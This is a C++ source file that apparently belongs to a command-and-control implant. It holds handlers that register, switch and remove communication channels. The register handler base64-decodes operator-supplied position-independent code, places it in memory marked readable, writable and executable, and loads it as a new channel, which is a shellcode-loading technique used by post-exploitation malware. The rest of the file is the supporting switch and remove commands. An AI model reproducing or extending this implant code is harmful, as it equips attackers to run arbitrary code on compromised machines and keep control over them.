#include "Command.h"

#include "Channel.h"
#include "Stdlib.h"

// CommandChannelRegister register a user defined channel
//
BOOL CommandChannelRegister( json& args, string artifact, json& result ) {
    DWORD size        = 0;
    BYTE* pic         = NULL;
    BYTE* config      = NULL;
    DWORD config_size = 0;
    BYTE* memory      = NULL;
    auto  argconfig   = args[0].get<string>();

    if (artifact.empty()) {
        return FALSE;
    }

    config = Base64Decode( argconfig.c_str(), &config_size );
    if (config == NULL) {
        return FALSE;
    }

    // decode channel pic
    pic = Base64Decode( artifact.c_str(), &size );
    if (pic == NULL) {
        return FALSE;
    }

    // allocate memory to run channel pic
    memory = (BYTE*)VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if (memory == NULL) {
        return FALSE;
    }

    // load channel pic
    if (!ChannelLoad( memory, pic, size )) {
        return FALSE;
    }

    if (!ChannelRegister( memory, size, config, config_size )) {
        return FALSE;
    }

    result["name"]   = "channel.register";
    result["output"] = "[+] Channel registred successfully";

    return TRUE;
}

// CommandChannelSwitch switch channel
//
BOOL CommandChannelSwitch( json& args, string artifact, json& result ) {
    DWORD ChannelID = 0;

    ChannelID = args[0].get<DWORD>();
    if (!ChannelSwitch( ChannelID )) {
        printf( "Failed to swtich channel\n" );
        result["output"] = "[-] Failed to swtich channel";
        return FALSE;
    }

    printf( "Channel switched successfully\n" );
    result["name"]   = "channel.switch";
    result["output"] = "[+] Channel switched successfully";

    return TRUE;
}

// CommandChannelRemove remove registered channel
//
BOOL CommandChannelRemove( json& args, string artifact, json& result ) {
    DWORD ChannelID = 0;

    ChannelID = args[0].get<DWORD>();

    if (g_Channel->Interface->ID == ChannelID) {
        result["output"] = "[!] channel is used";
        return FALSE;
    }

    if (!ChannelRemove( ChannelID )) {
        result["output"] = "[-] Failed to remove channel";
        return FALSE;
    }

    result["name"]   = "channel.switch";
    result["output"] = "[+] Channel removed successfully";

    return TRUE;
}
